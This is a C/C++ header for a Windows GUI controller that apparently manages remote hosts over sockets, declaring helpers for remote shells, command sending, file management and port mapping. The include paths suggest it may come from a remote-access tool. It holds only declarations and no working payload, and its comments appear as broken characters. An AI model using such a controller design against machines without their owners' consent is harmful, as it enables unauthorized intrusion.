#ifndef _MAIN_H
#define _MAIN_H

#define _WIN32_IE 0x0500
#define _WIN32_WINNT    0x0500

#include <winsock2.h>
#include <MSTcpIP.h>
#include <windows.h>
#include <Richedit.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <memory.h>
#include <commctrl.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "res\resource.h"
#include "..\zxsCommon\SocketList.h"
#include "ShellList.h"

#pragma comment (lib,"shlwapi.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Winmm.lib")

struct MAIN
{
	HINSTANCE hInst;
	HWND hWnd;
};

#pragma pack(push, 1)

struct MASTER{
	DWORD MainFlag;
	DWORD SubFlag;
	float Version;
	DWORD Action;
};

#pragma pack(pop)

#define MAXBUFSIZE 8192

#define WM_SOCKET (WM_APP+1)

#define ID_TASKBARICON 100
#define WM_ICONNOTIFY           (WM_USER + 101)

extern char TempBuf[MAXBUFSIZE+128];
extern MAIN Main;
extern LPCTSTR lpMemSound_IN;
extern LPCTSTR lpMemSound_OUT;
extern LPCTSTR lpMemSound_OPENFILE;
extern LPCTSTR lpMemSound_Notify;
extern LPCTSTR lpMemSound_Recycle;
extern LPCTSTR lpMemSound_Error;
extern int nextHostIdx;
extern HICON hMainIcon;
extern HCURSOR hSeparateCursor;
extern HWND hWndSocket;

extern C_SHELLLIST g_ShellList;
extern C_CMDCONNLIST g_CmdConnList;
extern C_SOCKETLIST g_Socket_Actions;


int SendCmdToServer(SOCKET Socket, char *Cmd, int len);
BOOL OutPutResult(char *szBuf, HWND hWnd=Main.hWnd);


BOOL GetDirPath(HWND hWnd, BOOL FileOrDir, char *RetPath);

void err_display(HWND hCtrl, char *msg, DWORD errCode);
void err_display(HWND hCtrl, DWORD errCode);
int MessageBox(HWND hWnd, UINT uType, char *title, const char *szMsg, ...);
int SendMessage(SOCKET Socket, const char *fmt, ...);
int RecvMessage(SOCKET Socket, char *RecvBuf, int DataLen, int TimeOut_sec);

char *GetPeerIPStr(SOCKET s);

BOOL TurnOnKeepAlive(SOCKET s, int time, int interval);
void ForceCloseSocket(SOCKET s);
int __Send(SOCKET s, char *DataBuf, int DataLen, int TimeOut_sec);//��DataBuf�е�DataLen���ֽڷ���sȥ
int __Recv(SOCKET s, char *RecvBuf, int BufSize, int TimeOut_sec);

//���LISTVIEW�е�����
int CopyHostInfo(HWND hCtrl, const int index, int start_iSubItem, int count_SubItem, char **buf);

void TranMsg();
DWORD CALLBACK GetProgress(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);

int Startup_GETCMD(SOCKET Socket);

LRESULT CALLBACK SocketMsgProc(HWND hWnd, UINT uMsg, 
	WPARAM wParam, LPARAM lParam);

int CALLBACK ConnInfoDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);

int CALLBACK SortListViewCompareFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
BOOL TaskBar(int nimMode, HICON hSetIcon = NULL, LPCSTR tip = NULL, LPCSTR info = NULL);
int CALLBACK MainDlgProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
int CALLBACK FileManagerDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);
int CALLBACK GetStringProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);
int CALLBACK PortMapDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);
int CALLBACK GetCMDDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitMainPanel();
BOOL SendCmdLine(char *Cmd);
BOOL GetSelectedItems(SOCKET *Socket);
int GetHostItemIdxBySocket(SOCKET s);

int DeleteExistFile(char *lpFileName);

#endif
